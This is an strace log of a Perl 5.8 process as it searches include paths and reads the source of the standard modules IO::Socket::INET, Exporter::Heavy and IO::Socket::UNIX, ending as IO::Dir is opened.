5498  07:09:19.832936 read(10, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
5498  07:09:19.833493 _llseek(10, 6698, [6698], SEEK_SET) = 0
5498  07:09:19.833509 _llseek(10, 0, [6698], SEEK_CUR) = 0
5498  07:09:19.833520 close(10)         = 0
5498  07:09:19.833539 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.833558 stat64("/etc/perl/IO/Socket/INET.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.833573 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.833587 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.833601 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.833613 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.833627 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.833640 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.833653 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.833666 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.833679 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.833693 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
5498  07:09:19.833723 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 10
5498  07:09:19.833764 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2438) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.833790 _llseek(10, 0, [0], SEEK_CUR) = 0
5498  07:09:19.833808 read(10, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
5498  07:09:19.834121 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834136 stat64("/etc/perl/Exporter/Heavy.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834150 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834163 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834177 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834190 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834204 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834227 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834264 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834305 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834323 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834336 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834351 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.834364 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
5498  07:09:19.834386 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.834415 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.834426 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.834458 read(11, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
5498  07:09:19.836172 read(11, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
5498  07:09:19.836468 brk(0x829c000)    = 0x829c000
5498  07:09:19.836867 read(11, "", 4096) = 0
5498  07:09:19.836898 close(11)         = 0
5498  07:09:19.837933 read(10, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
5498  07:09:19.838450 _llseek(10, 6496, [6496], SEEK_SET) = 0
5498  07:09:19.838468 _llseek(10, 0, [6496], SEEK_CUR) = 0
5498  07:09:19.838478 close(10)         = 0
5498  07:09:19.838542 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.838559 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.838607 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.838650 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.838682 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.838709 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.838738 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.838750 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.838765 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.838777 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.838791 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.838806 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
5498  07:09:19.838829 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 10
5498  07:09:19.838846 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2438) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.838859 _llseek(10, 0, [0], SEEK_CUR) = 0
5498  07:09:19.838875 brk(0x82bd000)    = 0x82bd000
5498  07:09:19.838895 read(10, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
5498  07:09:19.839842 _llseek(10, 1386, [1386], SEEK_SET) = 0
5498  07:09:19.839861 _llseek(10, 0, [1386], SEEK_CUR) = 0
5498  07:09:19.839871 close(10)         = 0
5498  07:09:19.839942 stat64("/etc/perl/IO/Dir.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.839994 stat64("/etc/perl/IO/Dir.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840039 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840053 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840067 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840093 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840107 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840119 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840132 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840143 stat64("/usr/share/perl5/IO/Dir.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840156 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840169 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
5498  07:09:19.840189 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 10
5498  07:09:19.840204 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2438) = -1 ENOTTY (Inappropriate ioctl for device)
